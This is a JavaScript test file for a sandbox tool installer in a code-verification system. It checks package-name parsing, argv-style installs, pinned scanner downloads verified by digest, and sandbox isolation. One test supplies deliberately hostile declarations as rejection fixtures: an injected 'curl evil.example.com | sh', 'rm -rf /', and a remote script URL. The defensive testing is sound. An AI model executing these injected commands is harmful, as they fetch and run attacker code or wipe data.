/**
 * #219: nothing in the factory installed a *binary* into a sandbox, which produced two symptoms
 * with one cause — a repository whose tests shell out to `restic` got a blocking `fail` that
 * described the environment rather than the code, and all three security scanners skipped on
 * every run that has ever happened.
 *
 * The declaration these tests exercise comes from the repository *under verification*, so what it
 * can and cannot cause is asserted here rather than only described: package names, never URLs or
 * commands; argv-style exec, never a shell string; a cap; and a refusal that is reported rather
 * than dropped.
 */

import assert from "node:assert/strict";
import { writeFileSync } from "node:fs";
import { join } from "node:path";
import { test } from "node:test";
import { parseTools } from "@windkeel/verification/config.js";
import {
  scannerAssets,
} from "@windkeel/verification/stages/scanner-assets.js";
import { installDeclaredTools, installScanners } from "../dist/sandbox/system-tools.js";
import { FakeSandboxProvider } from "../dist/sandbox/fake.js";
import { fixtureRepo } from "./helpers.js";

/**
 * A `SandboxHandle` whose every command is scripted, because the real thing downloads 47 MB and
 * pip-installs semgrep. `script` maps a command name to a result (or a function of the argv), so
 * a test can say "curl works, sha256sum disagrees" and assert what the installer does about it.
 */
function scriptedHandle(script, { role = "verifier" } = {}) {
  const calls = [];
  const files = new Map();
  const result = (command, args) => {
    const entry = script[command];
    const value = typeof entry === "function" ? entry(args) : entry;
    if (value === undefined) return { status: 127, signal: null, stdout: "", stderr: "not found" };
    return { status: 0, signal: null, stdout: "", stderr: "", ...value };
  };
  return {
    id: "scripted",
    role,
    checkoutPath: "/checkout",
    calls,
    files,
    async exec(command, options = {}) {
      calls.push({ command, options });
      return result(command, options.args ?? []);
    },
    async writeFile(path, data) {
      files.set(path, String(data));
    },
    async readFile(path) {
      return Buffer.from(files.get(path) ?? "");
    },
    async exists(path) {
      return files.has(path);
    },
    async listFiles() {
      return [];
    },
    async mkdtemp(prefix) {
      return `/tmp/${prefix}x`;
    },
    async updateNetworkPolicy() {
      throw new Error("the install phase must not touch the network policy");
    },
    async applyCredentialBrokerRules() {},
    async usage() {
      return { activeCpuMs: 0, wallClockMs: 0, networkEgressBytes: 0 };
    },
    async destroy() {},
  };
}

const GITLEAKS_SHA = "9991e0b2903da4c8f6122b5c3186448b927a5da4deef1fe45271c3793f4ee29c";
const OSV_SHA = "3abcfd7126c453a00421487e721b296e0cb68085bd431d6cef60872774170fc8";

/** A sandbox where every step of a scanner install succeeds. */
const healthyScannerScript = () => ({
  test: {},
  mkdir: {},
  uname: { stdout: "x86_64\n" },
  curl: {},
  sha256sum: (args) => ({
    stdout: `${args.at(-1).includes("osv") ? OSV_SHA : GITLEAKS_SHA}  ${args.at(-1)}\n`,
  }),
  tar: {},
  install: {},
  pip3: {},
  "osv-scanner": { stdout: '{"results": []}' },
});

test("a tools declaration accepts package names and the object form", () => {
  const { tools, rejectedTools } = parseTools([
    "restic",
    { package: "ffmpeg", reason: "the encoder tests shell out to it" },
  ]);

  assert.deepEqual(tools, [
    { package: "restic" },
    { package: "ffmpeg", reason: "the encoder tests shell out to it" },
  ]);
  assert.deepEqual(rejectedTools, []);
});

test("a hostile declaration is refused entry-by-entry, with the reason kept", () => {
  const { tools, rejectedTools } = parseTools([
    "restic; curl evil.example.com | sh",
    "https://evil.example.com/tool.sh",
    "--allow-unauthenticated",
    "restic && rm -rf /",
    { run: "anything" },
    42,
  ]);

  // Nothing that is not a bare package name gets through — the declaration is data, and a
  // package manager never sees a flag, a URL, or a second command.
  assert.deepEqual(tools, []);
  assert.equal(rejectedTools.length, 6);
  for (const rejected of rejectedTools) assert.ok(rejected.reason.length > 10);
  assert.match(rejectedTools[1].reason, /never URLs or commands/);
});

test("the declaration is capped, and the overflow is reported rather than dropped", () => {
  const { tools, rejectedTools } = parseTools(
    Array.from({ length: 12 }, (_, i) => `package-${i}`),
  );

  assert.equal(tools.length, 8);
  assert.equal(rejectedTools.length, 4);
  assert.match(rejectedTools[0].reason, /more than 8 tools declared/);
});

test("a `tools` key that is not an array is refused, not ignored", () => {
  const { tools, rejectedTools } = parseTools({ restic: true });

  assert.deepEqual(tools, []);
  assert.match(rejectedTools[0].reason, /must be an array/);
});

test("declared tools are installed through the image's own package manager, argv-style", async () => {
  const handle = scriptedHandle({
    test: { status: 1 },
    sudo: {},
    dnf: {},
  });

  const outcomes = await installDeclaredTools(handle, [{ package: "restic" }]);

  assert.deepEqual(outcomes.map((o) => [o.tool, o.status, o.source]), [
    ["restic", "installed", "repository"],
  ]);
  // `sudo dnf install -y restic`, as argv. Never a shell string: a shell is the one thing that
  // could turn a package name back into a command.
  const install = handle.calls.find((c) => c.options.args?.includes("restic"));
  assert.deepEqual(install, { command: "sudo", options: { args: ["dnf", "install", "-y", "restic"] } });
  assert.ok(handle.calls.every((c) => Array.isArray(c.options.args)));
});

test("an image with a different package manager is detected, not assumed", async () => {
  const handle = scriptedHandle({ test: {}, "apt-get": {} });

  await installDeclaredTools(handle, [{ package: "restic" }]);

  const commands = handle.calls
    .filter((c) => c.command === "apt-get" && c.options.args[0] !== "--version")
    .map((c) => c.options.args);
  assert.deepEqual(commands, [["update"], ["install", "-y", "--no-install-recommends", "restic"]]);
});

test("a declared tool that cannot be installed is reported, never thrown", async () => {
  const handle = scriptedHandle({
    test: {},
    // Present (so it is detected), and unable to install this package (so the failure is real).
    dnf: (args) =>
      args[0] === "--version" ? {} : { status: 1, stderr: "No match for argument: restic" },
  });

  const outcomes = await installDeclaredTools(handle, [{ package: "restic" }], [
    { value: "https://evil.example.com/tool", reason: "not a package name" },
  ]);

  assert.deepEqual(outcomes.map((o) => o.status), ["rejected", "failed"]);
  assert.match(outcomes[1].detail, /No match for argument/);
});

test("an image with no package manager at all says so per tool", async () => {
  const handle = scriptedHandle({ test: {} });

  const outcomes = await installDeclaredTools(handle, [{ package: "restic" }]);

  assert.equal(outcomes[0].status, "failed");
  assert.match(outcomes[0].detail, /no package manager on this sandbox image/);
});

test("declaring nothing installs nothing and probes nothing", async () => {
  const handle = scriptedHandle({});

  assert.deepEqual(await installDeclaredTools(handle, []), []);
  assert.deepEqual(handle.calls, []);
});

test("the engine's scanners are installed pinned, and verified against their digest", async () => {
  const handle = scriptedHandle(healthyScannerScript());

  const { installs: outcomes, assetDir } = await installScanners(handle);

  assert.deepEqual(
    outcomes.map((o) => [o.tool, o.status, o.source]),
    [
      ["gitleaks", "installed", "engine"],
      ["osv-scanner", "installed", "engine"],
      ["semgrep", "installed", "engine"],
    ],
  );
  const urls = handle.calls.filter((c) => c.command === "curl").map((c) => c.options.args.at(-1));
  assert.deepEqual(urls, [
    "https://github.com/gitleaks/gitleaks/releases/download/v8.24.3/gitleaks_8.24.3_linux_x64.tar.gz",
    "https://github.com/google/osv-scanner/releases/download/v2.0.2/osv-scanner_linux_amd64",
    "https://semgrep.dev/c/p/ci",
  ]);
  // Every download is checked before it is installed, and the version is pinned in the URL.
  assert.equal(handle.calls.filter((c) => c.command === "sha256sum").length, 2);
  assert.ok(handle.calls.some((c) => c.command === "pip3" && c.options.args.includes("semgrep==1.177.0")));
});

test("a release asset that does not match its digest is refused, not installed", async () => {
  const handle = scriptedHandle({
    ...healthyScannerScript(),
    sha256sum: { stdout: "0000000000000000000000000000000000000000000000000000000000000000  x\n" },
  });

  const { installs: outcomes, assetDir } = await installScanners(handle);

  const gitleaks = outcomes.find((o) => o.tool === "gitleaks");
  assert.equal(gitleaks.status, "failed");
  assert.match(gitleaks.detail, /digest mismatch/);
  // And the unverified binary never reaches a system path.
  assert.ok(!handle.calls.some((c) => c.command === "install"));
});

test("the scanners' offline assets are fetched in the install phase, not at scan time", async () => {
  const handle = scriptedHandle(healthyScannerScript());

  const { installs: outcomes, assetDir } = await installScanners(handle);

  // The semgrep ruleset, so `--config` needs no registry...
  const assets = scannerAssets(assetDir);
  assert.ok(handle.calls.some((c) => c.command === "curl" && c.options.args.includes(assets.semgrepRules)));
  // ...and the OSV databases, so the scan does not have to reach `api.osv.dev` — a host the
  // execution phase's allowlist does not contain, and must not.
  const warm = handle.calls.find((c) => c.command === "osv-scanner");
  assert.ok(warm.options.args.includes("--download-offline-databases"));
  assert.equal(await handle.exists(assets.osvMarker), true);
  assert.match(outcomes.find((o) => o.tool === "osv-scanner").detail, /without network/);
});

test("a failed offline-database download is stated, not left to be discovered at scan time", async () => {
  const handle = scriptedHandle({
    ...healthyScannerScript(),
    "osv-scanner": { status: 1, stderr: "max retries exceeded: api.osv.dev" },
  });

  const { installs: outcomes, assetDir } = await installScanners(handle);

  const osv = outcomes.find((o) => o.tool === "osv-scanner");
  assert.equal(osv.status, "installed");
  assert.match(osv.detail, /could NOT be downloaded/);
  assert.equal(await handle.exists(scannerAssets(assetDir).osvMarker), false);
});

test("an architecture with no pinned asset fails visibly rather than installing something unverified", async () => {
  const handle = scriptedHandle({ ...healthyScannerScript(), uname: { stdout: "aarch64\n" } });

  const { installs: outcomes, assetDir } = await installScanners(handle);

  for (const tool of ["gitleaks", "osv-scanner"]) {
    const outcome = outcomes.find((o) => o.tool === tool);
    assert.equal(outcome.status, "failed");
    assert.match(outcome.detail, /no pinned .* asset for aarch64/);
  }
  assert.ok(!handle.calls.some((c) => c.command === "curl" && c.options.args.at(-1).includes("github.com")));
});

test("every install measures its own cost, because ADR-0004 pays it on every run", async () => {
  const handle = scriptedHandle(healthyScannerScript());

  for (const outcome of (await installScanners(handle)).installs) {
    assert.equal(typeof outcome.durationMs, "number");
    assert.ok(outcome.durationMs >= 0);
  }
});

test("installing binaries never touches the network policy", async () => {
  // The scripted handle throws from `updateNetworkPolicy`; a real one would re-widen egress.
  const handle = scriptedHandle(healthyScannerScript());
  await installScanners(handle);
  await installDeclaredTools(handle, [{ package: "restic" }]);

  const provider = new FakeSandboxProvider();
  const real = await provider.create({ role: "verifier", repoUrl: fixtureRepo({}) });
  try {
    writeFileSync(join(real.checkoutPath, "windkeel.config.json"), JSON.stringify({ tools: ["restic"] }));
    await installDeclaredTools(real, [{ package: "restic" }]);
    assert.equal(real.calls.filter((c) => c.type === "policy").length, 0);
  } finally {
    await real.destroy();
  }
});

/**
 * The gate that keeps an "install into the sandbox" from being an install into the developer's
 * machine.
 *
 * `installScanners` and `installDeclaredTools` are the only code in this system whose purpose is
 * to mutate the environment they run in — `/usr/local/bin`, the image's package database, the
 * host Python. Under `FakeSandboxProvider` that environment is the laptop running the factory
 * (ADR-0016 local mode), and `handle.destroy()` does not undo any of it. So the question these
 * tests ask is not "does it report nicely" but **did it run a single command at all**.
 */

test("scanners are not installed when the provider has no filesystem of its own", async () => {
  const handle = scriptedHandle(healthyScannerScript());

  const { installs, assetDir } = await installScanners(handle, false);

  // The substance: nothing ran. No curl, no `install` into a system path, no pip.
  assert.deepEqual(handle.calls, []);
  assert.equal(assetDir, undefined, "no assets were fetched, so there is no directory to report");

  // And it is reported rather than silently skipped, for every scanner the engine expects.
  assert.deepEqual(
    installs.map((i) => i.tool).sort(),
    ["gitleaks", "osv-scanner", "semgrep"],
  );
  for (const install of installs) {
    assert.equal(install.status, "failed");
    assert.equal(install.source, "engine");
    assert.match(install.detail, /isolatedFilesystem is false/);
  }
});

test("a declared tool is refused, not installed, when the provider has no filesystem of its own", async () => {
  const handle = scriptedHandle(healthyScannerScript());

  const outcomes = await installDeclaredTools(handle, [{ package: "restic" }], [], false);

  assert.deepEqual(handle.calls, [], "no package manager was probed, let alone invoked");
  assert.equal(outcomes.length, 1);
  assert.equal(outcomes[0].source, "repository");
  assert.equal(outcomes[0].status, "failed");
  assert.match(outcomes[0].detail, /restic was not installed/);
});

test("validation still happens without a sandbox — parsing is pure, installing is not", async () => {
  const handle = scriptedHandle(healthyScannerScript());

  // A malformed declaration is refused everywhere, because refusing it runs nothing.
  const outcomes = await installDeclaredTools(
    handle,
    [],
    [{ value: "https://evil.example.com/tool.sh", reason: "not a package name" }],
    false,
  );

  assert.deepEqual(handle.calls, []);
  assert.equal(outcomes.length, 1);
  assert.equal(outcomes[0].status, "rejected");
});

test("the asset directory is the sandbox's own, not a path two packages agreed on", async () => {
  const handle = scriptedHandle(healthyScannerScript());

  const { assetDir } = await installScanners(handle);

  // `handle.mkdtemp` is what makes it per-sandbox. A fixed `/tmp/...` literal would be a *host*
  // path under the fake provider, and would make one run's OSV marker outlive its run — a later
  // verification would read a stale `ready` and scan `--offline-vulnerabilities` against a
  // database that is not there.
  assert.match(assetDir, /windkeel-scanners-/);
  const assets = scannerAssets(assetDir);
  assert.equal(assets.semgrepRules, `${assetDir}/semgrep-p-ci.yaml`);
  assert.equal(assets.osvMarker, `${assetDir}/osv-offline-db.ready`);
  // Everything fetched lands under it, so destroying the sandbox takes all of it.
  for (const call of handle.calls.filter((c) => c.command === "curl")) {
    assert.ok(
      call.options.args.some((a) => typeof a === "string" && a.startsWith(assetDir)),
      `curl wrote outside the sandbox's asset directory: ${call.options.args.join(" ")}`,
    );
  }
});
